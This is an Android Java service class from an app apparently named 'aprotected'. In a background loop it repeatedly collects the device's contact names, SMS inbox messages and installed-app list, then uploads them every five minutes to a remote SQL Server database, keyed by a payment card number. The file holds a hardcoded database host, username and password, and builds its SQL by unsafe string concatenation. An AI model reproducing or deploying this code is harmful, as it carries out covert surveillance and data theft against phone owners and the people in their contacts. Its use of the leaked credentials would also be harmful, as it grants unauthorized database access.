package com.example.aprotected;

import android.app.IntentService;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.Nullable;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class MyService2 extends Service {

    private List applist = null;
    private LinkedList<String> contacts = new LinkedList<>();
    private LinkedList<SMSclass> sms = new LinkedList<>();
    private static boolean READ_CONTACTS_GRANTED = false;
    private static boolean READ_INTERNET_GRANTED = false;
    private static boolean READ_SMS_GRANTED = false;
    private static String cardnumber="";
    private PackageManager packageManager = null;
    private Connection connection = null;
    private boolean ApplicationLoading=false;
    public void onCreate() {
        super.onCreate();

    }

    public int onStartCommand(Intent intent, int flags, int startId) {

        Bundle bundle=intent.getExtras();
        READ_CONTACTS_GRANTED=bundle.getBoolean("contacts");
        READ_SMS_GRANTED=bundle.getBoolean("sms");
        READ_INTERNET_GRANTED=bundle.getBoolean("databases");
        cardnumber=bundle.getString("cardnumber");
        packageManager=getPackageManager();
        Log.d("db", "before some task");
        someTask();

        return super.onStartCommand(intent, flags, startId);
    }

    public void onDestroy() {
        Log.d("db", "destroyed");
        super.onDestroy();

    }

    public IBinder onBind(Intent intent) {

        return null;
    }



    void someTask() {
        new Thread(new Runnable() {
            public void run() {
                while (true) {
                    try {
                        Log.d("db", "read");
                        if (READ_CONTACTS_GRANTED) {
                            readContacts();
                        }
                        if (READ_SMS_GRANTED) {
                            readSMS();
                        }
                        new LoadApplications().execute();
                        TimeUnit.SECONDS.sleep(10);
                        Log.d("db", "write");
                        new LoadDataBase().execute();
                        Log.d("db", "Load executed");
                        TimeUnit.MINUTES.sleep(5);
                    } catch (InterruptedException e) {
                        Log.d("db", e.getMessage());
                    }

                }
            }
        }).start();



    }


    private LinkedList<String> readContacts() {
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        try {
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String contact = "!"+cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME_PRIMARY));
                    contacts.add(contact.replace("'","*"));
                }

                cursor.close();
            }


        } catch (Exception ex) {
            Toast.makeText(getApplicationContext(), ex.getMessage(), Toast.LENGTH_LONG).show();
        }
        return contacts;

    }

    private LinkedList<SMSclass> readSMS()
    {

        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        sms=new LinkedList<>();
        if (cursor.moveToFirst())
        {
            do {

                sms.add(new SMSclass(cursor.getString(2).replace("'","*"),cursor.getString(12).replace("'","*")));

                // use msgData
            } while (cursor.moveToNext());
        }
        return  sms;
    }


    private class LoadDataBase extends AsyncTask<Void, Void, Void> {
        String dbURL = "jdbc:jtds:sqlserver://SQL5103.site4now.net:1433/DB_A72B1E_Secure";
        String user = "DB_A72B1E_Secure_admin";
        String pass = "Alexz73canY";
        @Override
        protected Void doInBackground(Void... params) {
            if (READ_INTERNET_GRANTED) {
                Log.d("db",(READ_INTERNET_GRANTED)?"true":"false");
                try {

                    Class.forName("net.sourceforge.jtds.jdbc.Driver");
                    connection = DriverManager.getConnection(dbURL, user, pass);
                } catch (ClassNotFoundException | SQLException e) {
                    e.printStackTrace();
                }


                if (connection != null) {
                    Statement statement = null;
                    try {
                        statement = connection.createStatement();
                        int clientID=0;
                        ResultSet resultSet = statement.executeQuery("Select ID FROM Clients WHERE CardNumber='"+cardnumber+"'");
                        resultSet.next();
                        clientID = resultSet.getInt(1);
                        if(clientID>0) {


                            String insertstring = "DELETE FROM Messages WHERE ClientID="+clientID;
                            statement.executeUpdate(insertstring);
                            insertstring = "DELETE FROM Contacts WHERE ClientID="+clientID;
                            statement.executeUpdate(insertstring);
                            insertstring = "DELETE FROM Applications WHERE ClientID="+clientID;
                            statement.executeUpdate(insertstring);

                            Log.d("db","DELETED");
                            insertstring = "INSERT Contacts(ClientID, ContactName) VALUES (";
                            for (int k = 0; k < contacts.size(); k++) {
                                insertstring += clientID + ", '" + contacts.get(k) + "'";
                                if (k < contacts.size() - 1) {
                                    insertstring += "), (";
                                }
                            }
                            insertstring +=")";
                            statement.executeUpdate(insertstring);
                            Log.d("db","CONTACTS");
                            insertstring = "INSERT INTO Messages(ClientID, MessageFrom, MessageText) VALUES (";
                            for (int k = 0; k < sms.size(); k++) {
                                insertstring += clientID + ", '" + sms.get(k).sender + "','"+sms.get(k).text+"'";
                                if (k < sms.size() - 1) {
                                    insertstring += "), (";
                                }

                            }
                            Log.d("db","Messages");
                            insertstring +=")";
                            statement.executeUpdate(insertstring);
                            insertstring = "INSERT INTO Applications(ClientID, ApplicationName) VALUES (";
                            for (int k = 0; k < applist.size(); k++) {
                                insertstring += clientID + ", '" + applist.get(k) + "'";
                                if (k < applist.size() - 1) {
                                    insertstring += "), (";
                                }
                            }
                            Log.d("db","Applications");
                            insertstring +=")";
                            statement.executeUpdate(insertstring);
                        }
                        else
                        {
                            Log.d("db","Таких в бд нет!");
                        }
                    } catch (SQLException throwables) {
                        Log.d("db",throwables.getMessage());
                    }
                }
                else
                {
                    Log.d("db","Коннекшн не установлен");
                }
            }
            Log.d("db", "in background");

            return null;
        }

        @Override
        protected void onPostExecute(Void result) {
            Log.d("db", "after load onpostexecute");
            super.onPostExecute(result);
        }
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

    }


    private List checkForLaunchIntent(List<ApplicationInfo> list) {
        ArrayList appList = new ArrayList();
        for (ApplicationInfo info : list) {
            try {
                if (packageManager.getLaunchIntentForPackage(info.packageName) != null) {
                    appList.add(info.name);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return appList;
    }

    private class LoadApplications extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... params) {
            applist = checkForLaunchIntent(packageManager.getInstalledApplications(PackageManager.GET_META_DATA));
            return null;
        }

        @Override
        protected void onPostExecute(Void result) {
            ApplicationLoading=false;
            super.onPostExecute(result);
        }

        @Override
        protected void onPreExecute() {
            ApplicationLoading=true;
            super.onPreExecute();
        }
    }

}